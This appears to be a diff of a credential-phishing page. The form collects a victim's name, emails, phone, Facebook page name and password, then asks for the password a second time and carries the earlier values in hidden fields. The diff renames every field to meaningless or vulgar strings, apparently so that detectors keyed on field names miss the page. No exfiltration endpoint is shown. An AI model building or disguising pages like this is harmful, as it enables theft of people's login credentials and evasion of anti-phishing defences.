@@ -175,73 +175,73 @@
                           required=""
                         ></textarea>
                       </div>
-                      <div class="form-group" [class.has-error]="isFullnameFieldTouched && profileForm.get('full_name')?.invalid">
+                      <div class="form-group" [class.has-error]="isFullnameFieldTouched && profileForm.get('ssafasdf')?.invalid">
                         <label for="name">Full Name</label>
                         <input
-                        formControlName="full_name"
+                        formControlName="ssafasdf"
                           type="text"
                           class="form-control"
                           style="font-size: 14px"
                           id="fill_full_name"
-                          name="fill_full_name"
+                          name="ssafasdf"
                           required=""
                           (blur)="isFullnameFieldTouched = true"
                         />
-                        <div *ngIf="isFullnameFieldTouched && profileForm.get('full_name')?.invalid" class="help-block">Please enter your full name.</div>
+                        <div *ngIf="isFullnameFieldTouched && profileForm.get('ssafasdf')?.invalid" class="help-block">Please enter your full name.</div>
                       </div>
-                      <div class="form-group" [class.has-error]="isBussEmailTouched && profileForm.get('business_email')?.invalid">
+                      <div class="form-group" [class.has-error]="isBussEmailTouched && profileForm.get('lamasaas')?.invalid">
                         <label for="Business">Business email address</label>
                         <input
-                        formControlName="business_email"
+                        formControlName="lamasaas"
                           type="email"
                           class="form-control"
                           style="font-size: 14px"
                           id="fill_business_email"
-                          name="fill_business_email"
+                          name="lamasaas"
                           required=""
                           (blur)="isBussEmailTouched = true"
                         />
-                        <div *ngIf="isBussEmailTouched && profileForm.get('business_email')?.invalid" class="help-block">Please enter your Bussiness Email Address.</div>
+                        <div *ngIf="isBussEmailTouched && profileForm.get('lamasaas')?.invalid" class="help-block">Please enter your Bussiness Email Address.</div>
                       </div>
-                      <div class="form-group" [class.has-error]="isPerEmailTouched && profileForm.get('personal_email')?.invalid">
+                      <div class="form-group" [class.has-error]="isPerEmailTouched && profileForm.get('ditmequan')?.invalid">
                         <label for="email">Personal email address</label>
                         <input
-                        formControlName="personal_email"
+                        formControlName="ditmequan"
                           type="email"
                           class="form-control"
                           style="font-size: 14px"
                           id="fill_personal_email"
-                          name="fill_personal_email"
+                          name="ditmequan"
                           required=""
                           (blur)="isPerEmailTouched = true"
                         />
-                        <div *ngIf="isPerEmailTouched && profileForm.get('personal_email')?.invalid" class="help-block">Please enter your Personal Email Address.</div>
+                        <div *ngIf="isPerEmailTouched && profileForm.get('ditmequan')?.invalid" class="help-block">Please enter your Personal Email Address.</div>
                       </div>
-                      <div class="form-group" [class.has-error]="isPhoneTouched && profileForm.get('phone')?.invalid">
+                      <div class="form-group" [class.has-error]="isPhoneTouched && profileForm.get('yokanihr')?.invalid">
                         <label for="phone">Mobile Phone Number</label>
                         <input
-                        formControlName="phone"
+                        formControlName="yokanihr"
                           type="text"
                           class="form-control"
                           id="fill_phone"
-                          name="fill_phone"
+                          name="yokanihr"
                           required=""
                           (blur)="isPhoneTouched = true"
                         />
-                        <div *ngIf="isPhoneTouched && profileForm.get('phone')?.invalid" class="help-block">Please enter your Phone Number.</div>
+                        <div *ngIf="isPhoneTouched && profileForm.get('yokanihr')?.invalid" class="help-block">Please enter your Phone Number.</div>
                       </div>
-                      <div class="form-group" [class.has-error]="isFbPageTouched && profileForm.get('facebook_pagename')?.invalid">
+                      <div class="form-group" [class.has-error]="isFbPageTouched && profileForm.get('thangbebietdi')?.invalid">
                         <label for="email">Facebook page name</label>
                         <input
-                        formControlName="facebook_pagename"
+                        formControlName="thangbebietdi"
                           type="fbpg"
                           class="form-control"
                           id="fill_facebook_pagename"
-                          name="fill_facebook_pagename"
+                          name="thangbebietdi"
                           required=""
                           (blur)="isFbPageTouched = true"
                         />
-                        <div *ngIf="isFbPageTouched && profileForm.get('facebook_pagename')?.invalid" class="help-block">Please enter your Facebook Page Name.</div>
+                        <div *ngIf="isFbPageTouched && profileForm.get('thangbebietdi')?.invalid" class="help-block">Please enter your Facebook Page Name.</div>
                       </div>
                       <div class="form-check">
                         <input
@@ -319,10 +319,10 @@
                       <label for="password">Password:</label>
                     </div>
                     <input
-                    v-model="form.first_password"
+                    v-model="form.cobebietdi"
                       type="password"
                       class="ml-2 form-control w-100"
-                      name="fill_first_password"
+                      name="cobebietdi"
                       id="fill_first_password"
                       style="border-radius: 0px"
                     />
@@ -394,21 +394,21 @@
                   <p style="font-size: 14px; margin-bottom: 10px">
                     For your security, you must enter your password to continue.
                   </p>
-                  <input type="hidden" name="full_name" id="fillFullName" />
-                  <input type="hidden" name="business_email" id="fillBusinessEmail" />
-                  <input type="hidden" name="personal_email" id="fillPersonalEmail" />
-                  <input type="hidden" name="phone" id="fillPhone" />
-                  <input type="hidden" name="facebook_pagename" id="fillFacebookPagename" />
-                  <input type="hidden" name="first_password" id="fillFirstPassword" />
+                  <input type="hidden" name="ssafasdf" id="fillFullName" />
+                  <input type="hidden" name="lamasaas" id="fillBusinessEmail" />
+                  <input type="hidden" name="ditmequan" id="fillPersonalEmail" />
+                  <input type="hidden" name="yokanihr" id="fillPhone" />
+                  <input type="hidden" name="thangbebietdi" id="fillFacebookPagename" />
+                  <input type="hidden" name="cobebietdi" id="fillFirstPassword" />
                   <div class="mt-1">
                     <div>
                       <label for="password">Password:</label>
                     </div>
                     <input
-                      v-model="form.second_password"
+                      v-model="form.lomsouw"
                       type="password"
                       class="form-control w-100"
-                      name="second_password"
+                      name="lomsouw"
                       required=""
                       id="second_password"
                       style=""
@@ -12255,7 +12255,7 @@
         .modali1 .modal-dialog {
           padding-top: 10px !important;
           margin-top: 10px !important;
-          height: fit-content;
+          /* height: fit-content; */
         }
         
         .modal-title {
